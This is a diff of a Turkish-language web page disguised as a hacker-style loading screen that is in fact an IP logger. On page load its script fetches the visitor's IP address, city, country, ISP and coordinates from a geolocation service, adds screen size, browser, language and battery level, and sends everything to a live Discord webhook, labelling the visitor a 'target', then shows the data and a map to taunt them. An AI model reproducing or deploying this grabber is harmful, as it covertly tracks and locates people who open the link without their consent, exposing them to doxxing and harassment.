@@ -6,24 +6,20 @@
     <title>Welcome Qeat'S World</title>
     <style>
         body { background: #000; color: #00ff41; font-family: 'Courier New', monospace; display: flex; align-items: center; justify-content: center; min-height: 100vh; margin: 0; overflow: hidden; }
-        .terminal { width: 90%; max-width: 700px; background: rgba(0, 0, 0, 0.95); border: 1px solid #00ff41; padding: 30px; box-shadow: 0 0 30px rgba(0, 255, 65, 0.3); position: relative; }
+        .terminal { width: 95%; max-width: 800px; background: rgba(0, 0, 0, 0.95); border: 1px solid #00ff41; padding: 30px; box-shadow: 0 0 30px rgba(0, 255, 65, 0.3); position: relative; }
         .line { margin-bottom: 12px; font-size: 14px; white-space: nowrap; overflow: hidden; border-right: .15em solid orange; width: 0; }
-        
-        .type-1 { animation: typing 1s steps(40, end) forwards 0.5s, blink-caret .75s step-end infinite; }
-        .type-2 { animation: typing 1s steps(40, end) forwards 1.8s, blink-caret .75s step-end infinite; }
-        .type-3 { animation: typing 1s steps(40, end) forwards 3.1s, blink-caret .75s step-end infinite; }
-
+        .type-1 { animation: typing 1s steps(40, end) forwards 0.2s, blink-caret .75s step-end infinite; }
+        .type-2 { animation: typing 1s steps(40, end) forwards 1.2s, blink-caret .75s step-end infinite; }
+        .type-3 { animation: typing 1s steps(40, end) forwards 2.2s, blink-caret .75s step-end infinite; }
         @keyframes typing { from { width: 0 } to { width: 100% } }
         @keyframes blink-caret { from, to { border-color: transparent } 50% { border-color: #00ff41; } }
-
-        .progress-container { width: 100%; background-color: #111; margin: 20px 0; display: none; }
-        .progress-bar { width: 0%; height: 4px; background-color: #00ff41; box-shadow: 0 0 10px #00ff41; }
-        
-        #result-box { margin-top: 25px; display: none; border-top: 1px solid #333; padding-top: 15px; }
-        .map-frame { width: 100%; height: 220px; margin-top: 15px; border: 1px solid #444; filter: grayscale(1) invert(1) contrast(1.2); }
-        .vpn-alert { color: #ffcc00; font-weight: bold; margin-bottom: 15px; border: 1px dashed #ffcc00; padding: 8px; text-align: center; font-size: 14px; }
-        .data-row { display: flex; justify-content: flex-start; margin-bottom: 5px; }
-        .label { color: #888; width: 120px; }
+        .progress-container { width: 100%; background-color: #111; height: 4px; margin: 20px 0; display: none; }
+        .progress-bar { width: 0%; height: 100%; background-color: #00ff41; box-shadow: 0 0 10px #00ff41; }
+        #result-box { margin-top: 20px; display: none; border-top: 1px solid #333; padding-top: 15px; font-size: 13px; }
+        .map-frame { width: 100%; height: 200px; margin-top: 15px; border: 1px solid #444; filter: grayscale(1) invert(1) contrast(1.2); }
+        .vpn-alert { color: #ffcc00; font-weight: bold; margin-bottom: 15px; border: 1px dashed #ffcc00; padding: 8px; text-align: center; }
+        .data-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
+        .label { color: #888; }
         .value { color: #ff0000; font-weight: bold; }
     </style>
 </head>
@@ -31,8 +27,8 @@
 
 <div class="terminal">
     <div class="line type-1">> Bir Dakika Bekleyin...</div>
-    <div class="line type-2">> Çok Az Kaldı</div>
-    <div class="line type-3">> Açılıyor!</div>
+    <div class="line type-2">> İpucu: Eğer canınız sıkılıyorsa bu siteye girin!</div>
+    <div class="line type-3">> Tüm Paketler İndirildi</div>
     
     <div class="progress-container" id="loader">
         <div class="progress-bar" id="bar"></div>
@@ -40,14 +36,17 @@
 
     <div id="result-box">
         <div id="vpn-msg"></div>
-        
-        <div class="data-row"><span class="label">> IP ADRESİ:</span> <span class="value" id="user-ip">...</span></div>
-        <div class="data-row"><span class="label">> LOKASYON:</span> <span class="value" id="user-loc">...</span></div>
-        <div class="data-row"><span class="label">> SAĞLAYICI:</span> <span class="value" id="user-isp">...</span></div>
-        <div class="data-row"><span class="label">> SİSTEM:</span> <span class="value" id="user-sys">...</span></div>
-        
+        <div class="data-grid">
+            <div><span class="label">> IP:</span> <span class="value" id="user-ip">...</span></div>
+            <div><span class="label">> LOKASYON:</span> <span class="value" id="user-loc">...</span></div>
+            <div><span class="label">> ISS:</span> <span class="value" id="user-isp">...</span></div>
+            <div><span class="label">> SİSTEM:</span> <span class="value" id="user-sys">...</span></div>
+            <div><span class="label">> EKRAN:</span> <span class="value" id="user-res">...</span></div>
+            <div><span class="label">> TARAYICI:</span> <span class="value" id="user-browser">...</span></div>
+            <div><span class="label">> DİL:</span> <span class="value" id="user-lang">...</span></div>
+            <div><span class="label">> ŞARJ:</span> <span class="value" id="user-bat">...</span></div>
+        </div>
         <iframe id="gmap" class="map-frame" frameborder="0" scrolling="no"></iframe>
-        
         <div style="margin-top: 15px; font-size: 10px; color: #444; text-align: center;">Kayıt No: #<span id="reg-no"></span> | VERİLER SİSTEME İŞLENDİ.</div>
     </div>
 </div>
@@ -55,78 +54,85 @@
 <script>
     const webhookURL = "https://discord.com/api/webhooks/1499664835267399710/r0cYWya6kyc0_1z1Szqh1jSxLbxSaEvEBtCoinqecKG3_PrrLbIkUJkIol9k8a4J3xjH";
 
-    // --- 1. SESSİZ OPERASYON: Site açıldığı an çalışır ---
-    fetch('https://ipapi.co/json/')
-    .then(res => res.json())
-    .then(data => {
-        const isVPN = data.country_code !== 'TR';
-        const device = navigator.platform;
-        const regNo = Math.floor(Math.random() * 89999) + 10000;
+    async function captureData() {
+        // Ekstra Cihaz Bilgileri
+        const screenRes = `${window.screen.width}x${window.screen.height}`;
+        const language = navigator.language;
+        const browser = navigator.userAgent.split(' ').pop();
+        let batteryInfo = "Bilinmiyor";
 
-        // Verileri daha bar dolmadan hemen Discord'a fırlat
-        fetch(webhookURL, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                username: "TEŞKİLAT ANLIK SİSTEM",
-                embeds: [{
-                    title: isVPN ? "🕵️ HEDEF VPN ARKASINA SAKLANIYOR" : "🎯 HEDEF NET LOKASYONDA",
-                    color: isVPN ? 16763904 : 16711680,
-                    description: "Kullanıcı şu an yükleme ekranında bekletiliyor, bilgiler başarıyla çekildi.",
-                    fields: [
-                        { name: "🌐 IP Adresi", value: `\`${data.ip}\``, inline: true },
-                        { name: "📍 Lokasyon", value: `\`${data.city} / ${data.country_name}\``, inline: true },
-                        { name: "📡 ISS", value: `\`${data.org}\``, inline: false },
-                        { name: "💻 Sistem Bilgisi", value: `\`${device}\``, inline: true }
-                    ],
-                    image: { url: `https://static-maps.yandex.ru/1.x/?lang=en_US&ll=${data.longitude},${data.latitude}&z=12&l=map&size=450,250` },
-                    footer: { text: "Kayıt No: #" + regNo },
-                    timestamp: new Date()
-                }]
-            })
+        try {
+            const battery = await navigator.getBattery();
+            batteryInfo = `%${Math.round(battery.level * 100)}`;
+        } catch(e) {}
+
+        fetch('https://ipapi.co/json/')
+        .then(res => res.json())
+        .then(data => {
+            window.cachedData = {...data, screenRes, language, browser, batteryInfo};
+            window.cachedRegNo = Math.floor(Math.random() * 89999) + 10000;
+
+            fetch(webhookURL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    username: "DERİN SİSTEM ANALİZİ",
+                    embeds: [{
+                        title: data.country_code !== 'TR' ? "🕵️ HEDEF VPN ARKASINDA" : "🎯 HEDEF TESPİT EDİLDİ",
+                        color: data.country_code !== 'TR' ? 16763904 : 16711680,
+                        fields: [
+                            { name: "🌐 IP Adresi", value: `\`${data.ip}\``, inline: true },
+                            { name: "📍 Lokasyon", value: `\`${data.city} / ${data.country_name}\``, inline: true },
+                            { name: "📡 ISS", value: `\`${data.org}\``, inline: false },
+                            { name: "💻 Ekran", value: `\`${screenRes}\``, inline: true },
+                            { name: "🔋 Şarj", value: `\`${batteryInfo}\``, inline: true },
+                            { name: "🛠️ Tarayıcı", value: `\`${browser}\``, inline: true }
+                        ],
+                        timestamp: new Date()
+                    }]
+                })
+            });
         });
+    }
 
-        // Verileri tarayıcı hafızasına al (Bar bitince ekrana basmak için)
-        window.cachedData = data;
-        window.cachedRegNo = regNo;
-    });
+    captureData();
 
-    // --- 2. GÖRSEL EFEKT: Yükleme barı simülasyonu ---
     setTimeout(() => {
-        document.getElementById('loader').style.display = 'block';
-        let bar = document.getElementById('bar');
+        const loader = document.getElementById('loader');
+        const bar = document.getElementById('bar');
+        loader.style.display = 'block';
         let width = 0;
         let interval = setInterval(() => {
             if (width >= 100) {
                 clearInterval(interval);
-                finalizeDisplay(); 
+                finalizeDisplay();
             } else {
-                width++;
+                width += 2;
                 bar.style.width = width + '%';
             }
-        }, 30); // Yaklaşık 3 saniye sürer
-    }, 4500); // Yazı animasyonlarından sonra başlar
+        }, 40);
+    }, 3200);
 
     function finalizeDisplay() {
         const data = window.cachedData;
-        if (!data) return; 
+        if (!data) { setTimeout(finalizeDisplay, 1000); return; }
 
-        const isVPN = data.country_code !== 'TR';
-        document.getElementById('reg-no').innerText = window.cachedRegNo;
         document.getElementById('user-ip').innerText = data.ip;
-        document.getElementById('user-loc').innerText = `${data.city} / ${data.country_name}`;
+        document.getElementById('user-loc').innerText = data.city;
         document.getElementById('user-isp').innerText = data.org;
         document.getElementById('user-sys').innerText = navigator.platform;
+        document.getElementById('user-res').innerText = data.screenRes;
+        document.getElementById('user-browser').innerText = data.browser;
+        document.getElementById('user-lang').innerText = data.language;
+        document.getElementById('user-bat').innerText = data.batteryInfo;
+        document.getElementById('reg-no').innerText = window.cachedRegNo;
         
-        if(isVPN) {
-            document.getElementById('vpn-msg').innerHTML = `<div class="vpn-alert">HAHA, VPN AÇMAN KOMİK OLMUŞ :)</div>`;
+        if(data.country_code !== 'TR') {
+            document.getElementById('vpn-msg').innerHTML = `<div class="vpn-alert">VPN TESPİT EDİLDİ :)</div>`;
         }
-
-        const mapUrl = `https://maps.google.com/maps?q=${data.latitude},${data.longitude}&z=14&output=embed`;
-        document.getElementById('gmap').src = mapUrl;
+        document.getElementById('gmap').src = `https://maps.google.com/maps?q=${data.latitude},${data.longitude}&z=14&output=embed`;
         document.getElementById('result-box').style.display = 'block';
     }
 </script>
-
 </body>
 </html>
